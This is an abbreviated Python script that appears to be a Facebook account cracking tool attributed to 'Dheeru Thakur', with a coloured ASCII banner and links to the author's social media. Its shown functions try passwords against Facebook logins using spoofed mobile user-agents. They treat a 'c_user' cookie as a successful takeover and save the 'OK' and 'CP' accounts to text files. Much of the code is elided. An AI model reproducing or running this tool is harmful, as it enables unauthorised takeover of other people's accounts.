...
os.system("xdg-open https://youtube.com/@dheeruthakur6787?si=KCyARit3p9w-FciJ")
#app  check 


logo = """       

\033[1;36m ______            _______  _______  _______          
\033[1;31m(  __  \ |\     /|(  ____ \(  ____ \(  ____ )|\     /|
\033[1;32m| (  \  )| )   ( || (    \/| (    \/| (    )|| )   ( |
\033[1;37m| |   ) || (___) || (__    | (__    | (____)|| |   | |
\033[1;33m| |   | ||  ___  ||  __)   |  __)   |     __)| |   | |
\033[1;35m| |   ) || (   ) || (      | (      | (\ (   | |   | |
\033[1;32m| (__/  )| )   ( || (____/\| (____/\| ) \ \__| (___) |
\033[1;31m(______/ |/     \|(_______/(_______/|/   \__/(_______)
                                                      


\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34mOWNER DHEERU THAKUR
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36mDHEEEU THAKUR
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37mDHEERU5257
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34mTOOL IS FREE
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36m🤟🥰AVI TAK NA MILA KOE☝️😍
\033[1;32m[•] \033[1;33mVERSION      : » \033[1;33m0.0
\033[1;31m(•)=============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/mb.maksab?mibextid=9R9pXO")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def random_number():
	...
	print('[?] Ids saved in Dheeru ok.txt,Dheeru cp.txt')
	print(47*"-")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[DHEERU -OK] '+uid+' | '+ps)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
		...
		sys.stdout.write('\r\33[1;37m[DHEERU-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
